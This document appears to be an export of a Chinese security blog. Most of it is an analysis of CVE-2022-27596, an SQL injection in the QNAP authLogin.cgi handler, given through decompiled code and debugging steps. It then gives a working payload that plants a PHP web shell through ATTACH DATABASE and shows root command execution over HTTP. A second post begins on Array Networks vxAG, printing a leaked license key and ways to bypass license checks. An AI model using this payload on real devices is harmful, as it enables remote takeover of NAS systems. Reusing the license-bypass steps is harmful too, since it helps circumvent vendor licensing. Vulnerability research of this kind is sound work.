LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  app_token = <span class="number">0LL</span>;</span><br><span class="line">LABEL_9:</span><br><span class="line">  v9 = CGI_Find_Parameter(a1, <span class="string">&quot;renew&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    renew = strtol(*(v9 + <span class="number">8</span>), <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    renew = <span class="number">0</span>;</span><br><span class="line">  v11 = CGI_Find_Parameter(a1, <span class="string">&quot;auth&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v11 )</span><br><span class="line">  &#123;</span><br><span class="line">    auth = strtol(*(v11 + <span class="number">8</span>), <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">    v12 = CGI_Find_Parameter(a1, <span class="string">&quot;sid&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    auth = <span class="number">0</span>;</span><br><span class="line">    v12 = CGI_Find_Parameter(a1, <span class="string">&quot;sid&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      sid = *(v12 + <span class="number">8</span>);</span><br><span class="line">      v13 = CGI_Find_Parameter(a1, <span class="string">&quot;client_id&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v13 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sid = <span class="number">0LL</span>;</span><br><span class="line">  v13 = CGI_Find_Parameter(a1, <span class="string">&quot;client_id&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v13 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_14:</span><br><span class="line">    client_id = *(v13 + <span class="number">8</span>);</span><br><span class="line">    v15 = CGI_Find_Parameter(a1, <span class="string">&quot;client_app&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v15 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">LABEL_55:</span><br><span class="line">    client_app = <span class="number">0LL</span>;</span><br><span class="line">    v17 = CGI_Find_Parameter(a1, <span class="string">&quot;client_agent&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v17 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">LABEL_56:</span><br><span class="line">    client_agent = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_54:</span><br><span class="line">  client_id = <span class="number">0LL</span>;</span><br><span class="line">  v15 = CGI_Find_Parameter(a1, <span class="string">&quot;client_app&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v15 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">LABEL_15:</span><br><span class="line">  client_app = *(v15 + <span class="number">8</span>);</span><br><span class="line">  v17 = CGI_Find_Parameter(a1, <span class="string">&quot;client_agent&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v17 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">LABEL_16:</span><br><span class="line">  client_agent = *(v17 + <span class="number">8</span>);</span><br><span class="line">LABEL_17:</span><br><span class="line">  v19 = CGI_Find_Parameter(a1, <span class="string">&quot;duration&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v19 || ((v20 = strtol(*(v19 + <span class="number">8</span>), <span class="number">0LL</span>, <span class="number">10</span>), v20 &lt;= <span class="number">0</span>) ? (v21 = v20 == <span class="number">-1</span>) : (v21 = <span class="number">1</span>), v22 = v20, !v21) )</span><br><span class="line">    v22 = <span class="number">90</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !CGI_Find_Parameter(a1, <span class="string">&quot;gen_client_id&quot;</span>) || get_uuid(v79, <span class="number">257</span>, v23, v24, v25, v26, v27, v28, v64) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_411020();</span><br><span class="line">    <span class="keyword">if</span> ( Get_App_Token_Support(app) )</span><br><span class="line">    &#123;</span><br><span class="line">      v48 = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">    &#125;</span><br><span class="line">    v42 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( app_token )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">    <span class="keyword">if</span> ( ((v68 != <span class="number">0LL</span>) &amp; v67) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">LABEL_38:</span><br><span class="line">    <span class="keyword">if</span> ( !User_Belongs_To_Group(v68, <span class="string">&quot;administrators&quot;</span>) || b64_Decode_Ex(v84, <span class="number">512LL</span>, v76) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v84) &gt; <span class="number">0x40</span> )</span><br><span class="line">      v84[<span class="number">65</span>] = <span class="number">0</span>;</span><br><span class="line">    v51 = v68;</span><br><span class="line">    <span class="keyword">if</span> ( sub_40D990(v68, v84, <span class="number">1LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v48 = <span class="number">-1</span>;</span><br><span class="line">      sub_40EB90(app, v68, client_id, client_app, client_agent);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v66 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !client_id )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !Get_App_Token(app, v68, v78, <span class="number">257LL</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">        <span class="built_in">memset</span>(v78, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !Gen_App_Token(app, v68, v78, <span class="number">257LL</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">LABEL_39:</span><br><span class="line">      <span class="keyword">if</span> ( !sid )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_63;</span><br><span class="line">      <span class="keyword">if</span> ( auth_get_session(sid, <span class="number">1LL</span>, &amp;unk_43AAB8) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">      v51 = byte_43AB0A;</span><br><span class="line">      <span class="keyword">if</span> ( !User_Belongs_To_Group(byte_43AB0A, <span class="string">&quot;administrators&quot;</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">      <span class="keyword">if</span> ( !v66 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_63;</span><br><span class="line">      <span class="keyword">if</span> ( !client_id )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !Get_App_Token(app, byte_43AB0A, v78, <span class="number">257LL</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">        <span class="built_in">memset</span>(v78, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !Gen_App_Token(app, byte_43AB0A, v78, <span class="number">257LL</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">        v48 = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !Get_App_Token_by_Client_ID(app, v51, client_id, v78, <span class="number">257LL</span>) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">    <span class="built_in">memset</span>(v78, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">    v43 = v22;</span><br><span class="line">    v44 = client_agent;</span><br><span class="line">    v45 = client_app;</span><br><span class="line">    v46 = client_id;</span><br><span class="line">    v47 = v51;</span><br><span class="line">LABEL_32:</span><br><span class="line">    <span class="keyword">if</span> ( !Gen_App_Token_by_Client_ID(app, v47, v46, v45, v44, v43, v78, <span class="number">257LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_33:</span><br><span class="line">      v48 = <span class="number">0</span>;</span><br><span class="line">      sub_40F730(<span class="string">&quot;app_token&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;%s&quot;</span>, v34, v35, v36, v37, v38, v39, v40, v41, v78, v30, v31, v32, v33, v64);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_411020();</span><br><span class="line">  <span class="keyword">if</span> ( Get_App_Token_Support(app) )</span><br><span class="line">  &#123;</span><br><span class="line">    v48 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_51;</span><br><span class="line">  &#125;</span><br><span class="line">  client_id = v79;</span><br><span class="line">  v42 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !app_token )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">LABEL_27:</span><br><span class="line">  <span class="keyword">if</span> ( !*app_token )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">  <span class="keyword">if</span> ( !renew )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !auth )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( client_id )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( Verify_App_Token_by_Client_ID(client_id, app_token, v74, <span class="number">33LL</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_113:</span><br><span class="line">          v48 = <span class="number">-1</span>;</span><br><span class="line">          sub_40EB90(app, v74, client_id, client_app, client_agent);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( Verify_App_Token(app, app_token, v74, <span class="number">33LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_116:</span><br><span class="line">        v48 = <span class="number">-1</span>;</span><br><span class="line">        sub_40EB90(app, v74, <span class="number">0LL</span>, client_app, client_agent);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_63:</span><br><span class="line">      v48 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( client_id )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Verify_App_Token_by_Client_ID(client_id, app_token, v74, <span class="number">33LL</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_50;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( Verify_App_Token(app, app_token, v74, <span class="number">33LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_50:</span><br><span class="line">      v48 = <span class="number">-1</span>;</span><br><span class="line">      sub_40EB90(app, v74, client_id, client_app, client_agent);</span><br><span class="line">      <span class="keyword">if</span> ( !v42 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">LABEL_51:</span><br><span class="line">      sub_40F730(<span class="string">&quot;client_id&quot;</span>, <span class="number">0LL</span>, v79, v34, v35, v36, v37, v38, v39, v40, v41, v29, v30, v31, v32, v33, v64);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(v80, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( qtoken_query_by_token(app_token, &amp;v71) || (v52 = *(v71 + <span class="number">68</span>), v52 == <span class="number">-1</span>) )</span><br><span class="line">      v53 = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v53 = v52 + *(v71 + <span class="number">64</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sub_40EA10(app, v80, <span class="number">257LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v54 = client_app ? client_app : v80;</span><br><span class="line">      <span class="keyword">if</span> ( !auth_add_session_ex(&amp;v72, v74, <span class="number">1LL</span>, <span class="string">&quot;&quot;</span>, client_id, v54, client_agent, v53) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_411BA0(&amp;v72);</span><br><span class="line">        v55 = time(<span class="number">0LL</span>);</span><br><span class="line">        Update_Token_Last_Access_Time(app_token, v55);</span><br><span class="line">        <span class="built_in">memset</span>(v82, <span class="number">0</span>, <span class="number">0x1C8</span>uLL);</span><br><span class="line">        <span class="built_in">memset</span>(v81, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( app )</span><br><span class="line">        &#123;</span><br><span class="line">          CGI_Get_Http_Info(v82);</span><br><span class="line">          <span class="keyword">if</span> ( !sub_40EA10(app, v81, <span class="number">257LL</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( LOBYTE(v74[<span class="number">0</span>]) )</span><br><span class="line">              v56 = v74;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              v56 = <span class="string">&quot;---&quot;</span>;</span><br><span class="line">            v70 = v56;</span><br><span class="line">            <span class="keyword">if</span> ( is_https() )</span><br><span class="line">              v57 = <span class="number">11LL</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              v57 = <span class="number">3LL</span>;</span><br><span class="line">            v58 = <span class="string">&quot;---&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> ( client_id )</span><br><span class="line">              v58 = client_id;</span><br><span class="line">            <span class="keyword">if</span> ( client_app )</span><br><span class="line">              v59 = client_app;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              v59 = v81;</span><br><span class="line">            <span class="keyword">if</span> ( client_agent )</span><br><span class="line">              v60 = client_agent;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              v60 = <span class="string">&quot;Agent&quot;</span>;</span><br><span class="line">            SendConnToLogEngineEx4(<span class="number">0LL</span>, v70, v81, &amp;v83, <span class="string">&quot;---&quot;</span>, v57, <span class="number">10LL</span>, <span class="number">0LL</span>, v58, v59, v60, <span class="string">&quot;Administration&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">memset</span>(v82, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">          <span class="keyword">if</span> ( !sub_40EA10(app, v82, <span class="number">257LL</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( client_id )</span><br><span class="line">              v61 = client_id;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              v61 = <span class="string">&quot;---&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> ( client_app )</span><br><span class="line">              v62 = client_app;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              v62 = v82;</span><br><span class="line">            <span class="keyword">if</span> ( client_agent )</span><br><span class="line">              v63 = client_agent;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              v63 = <span class="string">&quot;Agent&quot;</span>;</span><br><span class="line">            v48 = <span class="number">0</span>;</span><br><span class="line">            shm_add_http_user_with_client_info(v74, <span class="string">&quot;Administration&quot;</span>, <span class="string">&quot;---&quot;</span>, v61, v62, v63);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_63;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_109:</span><br><span class="line">    v48 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( client_id )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !Verify_App_Token_by_Client_ID(client_id, app_token, v74, <span class="number">33LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v43 = v22;</span><br><span class="line">      v44 = client_agent;</span><br><span class="line">      v45 = client_app;</span><br><span class="line">      v46 = client_id;</span><br><span class="line">      v47 = v74;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_113;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( Verify_App_Token(app, app_token, v74, <span class="number">33LL</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_116;</span><br><span class="line">  <span class="keyword">if</span> ( !Gen_App_Token(app, v74, v78, <span class="number">257LL</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">  v48 = <span class="number">-1</span>;</span><br><span class="line">LABEL_34:</span><br><span class="line">  <span class="keyword">if</span> ( v42 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_51;</span><br><span class="line">LABEL_35:</span><br><span class="line">  v49 = sub_40F730(<span class="string">&quot;result&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;%d&quot;</span>, v34, v35, v36, v37, v38, v39, v40, v41, v48, v30, v31, v32, v33, v64);</span><br><span class="line">  sub_411060(v49);</span><br><span class="line">  qtoken_release(v71);</span><br><span class="line">  <span class="keyword">return</span> v48;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此函数会调用 so 库中的 Verify_App_Token，最终使用到存在漏洞的函数。</p>
<p>此函数逻辑比较复杂，简要描述从函数入口到 Verify_App_Token 调用位置流程：首先获取 app、user 等必要参数，然后判断用户是否传入了 gen_client_id，如果没有，则调用 Get_App_Token_Support 并传入 app 参数，尝试获取 app 相关配置信息。</p>
<p>Get_App_Token_Support 函数调用 lib 库中的 Get_App_Token_Support_List，此函数使用一些固定字符串构造出一系列 app 对象并返回，包括 MUSIC_STATION、PHOTO_STATION 等。</p>
<p>之后代码会判断用户传入的 app 参数是否和这些 app 对象中的一个相匹配，如果找不到任何匹配则退出。</p>
<p>如果找到了某个匹配，继续判断用户是否传入了 app_token 参数，如果用户传递了 app_token，并且没有传递 renew、auth、client_id 三个参数，代码就会调用 Verify_App_Token 并将 app_token 作为参数传入。</p>
<p>之后就会来到漏洞点，将 app_token 拼接到 token 查询语句之后，使用 sqlite3_exec 执行。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>我们可以通过调试来确定以上分析是否正确。目标程序为一个动态调用的 cgi，可通过循环附加实现调试。</p>
<p>上传一个 gdbserver 到文件系统，然后在设备上执行命令：</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span>;<span class="keyword">do</span> ./gdbserver 0.0.0.0:12345 --attach `ps | grep authLogin | <span class="built_in">head</span> -n1 | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`;<span class="keyword">done</span></span><br></pre></td></tr></table></figure></div>

<p>客户端 gdb 调试文件</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">file ./home/httpd/cgi-bin/authLogin.cgi</span><br><span class="line">b *0x00000000040F574</span><br><span class="line">target remote 192.168.0.177:12345</span><br></pre></td></tr></table></figure></div>

<p>我们将断点下在调用 Verify_App_Token 函数的位置。</p>
<p>发送以下数据包，注意要在 client_agent 参数中填入较多的字符，否则程序运行太快会错过关键位置。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /cgi-bin/authLogin.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.0.177:5000</span><br><span class="line">Content-Length: 158</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">app=MUSIC_STATION&amp;app_token=123&amp;sid=1&amp;client_app=1&amp;client_agent=&lt;&quot;a&quot; * 0x3000&gt;</span><br></pre></td></tr></table></figure></div>

<p>发包之后 gdb 在断点位置断下，找到 libLinux_NAS 库文件的基地址，加上偏移量，在漏洞函数 sqlite3_exec 位置下断点。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-27596-4.png"
                     
                ></p>
<p>执行到 sqlite3_exec 时，sql 语句的内容为 <code>SELECT * FROM QTOKEN WHERE token = &#39;123&#39;   ;</code>，token 部分刚好是我们传递的 app_token 参数值。</p>
<p>目标数据库为 sqlite，通用手段可以通过 ATTACH DATABASE 创建后门 php 文件，这里列举一种利用方法：QNAP 系统中有一些使用率较高的插件是由 PHP 编写的，比如我们这台设备中安装了 Music Station，这是一个可以整合设备上音乐资源的程序，其安装路径默认位于 <code>/share/CACHEDEV1_DATA/.qpkg/musicstation/</code>，我们通过漏洞在该路径下创建一个后门文件 qnaptest.php，payload 如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27;;ATTACH DATABASE &#x27;/share/CACHEDEV1_DATA/.qpkg/musicstation/qnaptest.php&#x27; AS qnapkey;CREATE TABLE qnapkey.key (dataz text);INSERT INTO qnapkey.key (dataz) VALUES (&quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;);--</span><br></pre></td></tr></table></figure></div>

<p>将其 URL 编码放在 app_token 参数中，发包后可以看到 qnaptest.php 成功创建：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-27596-5.png"
                     
                ></p>
<p>之后访问该文件即可以 root 身份执行命令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /musicstation/qnaptest.php?cmd=id HTTP/1.1</span><br><span class="line">Host: 192.168.0.1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">================================================</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 06 Feb 2023 08:36:43 GMT</span><br><span class="line">Server:  </span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27; ; object-src &#x27;self&#x27; ; worker-src &#x27;self&#x27; blob:</span><br><span class="line">Upgrade: h2</span><br><span class="line">Connection: Upgrade, close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-XSS-Protection: 1; mode=block</span><br><span class="line">Strict-Transport-Security: max-age=0</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 8197</span><br><span class="line"></span><br><span class="line">SQLite format 3 /Gtablekeykey CREATE TABLE key (dataz text) Iuid=0(admin) gid=0(administrators)</span><br></pre></td></tr></table></figure></div>

<h3 id="参考文章-x2F-拓展阅读"><a href="#参考文章-x2F-拓展阅读" class="headerlink" title="参考文章&#x2F;拓展阅读"></a>参考文章&#x2F;拓展阅读</h3><p>QNAP 官方发布的<a class="link"   href="https://www.qnap.com.cn/zh-cn/security-advisory/qsa-23-01" >漏洞通告<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<p>CWE-89 的<a class="link"   href="https://cwe.mitre.org/data/definitions/89.html" >定义<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<p>第三方安全<a class="link"   href="https://www.secrss.com/articles/51499" >通告<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>Array Networks vxAG 远程代码执行漏洞分析 (二)</title>
    <url>/2022/12/20/ArrayVPN_rce2/</url>
    <content><![CDATA[<p>本文为 Array Networks vxAG 远程代码执行漏洞分析的第二部分，主要介绍设备 License 和 VPN 安全问题。</p>
<span id="more"></span>

<h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p>正常导入设备后默认处于试用状态，只能使用部分基本功能，VPN 等功能需要导入合适的 License 之后才能开启。</p>
<p>(未导入 License 时，支持的功能为空)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_02.png"
                     
                ></p>
<p>(无法使用 VPN 功能)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_01.png"
                     
                ></p>
<p>正常来讲，我们需要获取试用版 License，或者分析验证逻辑，构造出合适的 License 来解锁各项功能，但是对于这款设备来说，有一种更方便的方法。</p>
<p>在某平台的设备帮助手册中，我找到了如下截图信息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_03.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_04.png"
                     
                ></p>
<p>文档中介绍了如何部署设备以及激活 License，其中的截图包含一个已经过期的具有 VPN 模块授权的 License (J1ErSzPo-3TiY8OYU-bTEsUFdn-wfA&#x3D;#131-4d67d9ab-a9cf1726-4c67eaa3-beef0123-4d#7ebaa-9cfe1#dc-ba98765)，到期时间为 2016 年 5 月 9 日。考虑能否直接将这个 License 导入设备中呢？</p>
<p>尝试修改时间之后导入 License，设备会报 License 非法错误：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_05.png"
                     
                ></p>
<p>猜测每个 License 对应一个设备的序列号，截图中对应的序列号为：4B756D5412DC3000000605120655416，想要导入 License 的话可以考虑修改设备序列号，或者简单分析一下 License 验证逻辑。</p>
<p>首先定位到验证逻辑的入口点：class.cliWrap_gLicense.php</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> (<span class="variable language_">$this</span>-&gt;classId . <span class="string">&#x27;_gLicenseImportValidate&#x27;</span>):</span><br><span class="line">	<span class="variable">$t_licenseCode</span> = <span class="variable">$_POST</span>[<span class="variable language_">$this</span>-&gt;classId . <span class="string">&#x27;_license_code&#x27;</span>];		<span class="comment">// 获取 license code</span></span><br><span class="line">	<span class="comment">//echo &#x27;Import With Validate.&lt;br&gt;LicCode=&#x27; . $t_licenseCode . &#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line">					</span><br><span class="line">	<span class="variable">$t_errStr</span> = cli::<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;system license &quot;&#x27;</span> . <span class="variable">$t_licenseCode</span> . <span class="string">&#x27;&quot;&#x27;</span>);    <span class="comment">// 执行 cli 命令验证</span></span><br><span class="line">	<span class="keyword">if</span> (!(<span class="variable">$t_errStr</span>-&gt;result)) &#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;jsOnLoadEnd .= <span class="string">&#x27;g_errStr += &quot;&#x27;</span> . language::<span class="title function_ invoke__">translate</span>(<span class="string">&#x27;alert_messageAlertFromSP&#x27;</span>) . <span class="string">&#x27;\n\n&#x27;</span> . (<span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%0A&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">addslashes</span>(cli::<span class="title function_ invoke__">get_reason_info</span>(<span class="variable">$t_errStr</span>)))))) . <span class="string">&#x27;&quot;;&#x27;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$t_result</span> = <span class="string">&#x27;License Key verification succeeded&#x27;</span>;</span><br><span class="line">			<span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$t_errStr</span>-&gt;content[<span class="number">0</span>], <span class="string">&quot;SVD is not licensed on this system&quot;</span>) != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">			<span class="variable">$t_result</span> .= <span class="string">&quot;&lt;br&gt;The SVD function has been disabled automatically because it is not included in this new license.&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;jsOnLoadEnd .= <span class="string">&#x27;showSPMessage(&quot;status&quot;, &quot;&#x27;</span> . language::<span class="title function_ invoke__">translate</span>(<span class="string">&#x27;status_operation_successful&#x27;</span>) . <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&#x27;</span> . <span class="variable">$t_result</span> . <span class="string">&#x27;&quot;);&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div>

<p>代码会调用 system license CLI 命令验证 License 内容。全局搜索之前的报错信息，发现其出现在 &#x2F;ca&#x2F;bin&#x2F;backend 二进制中。</p>
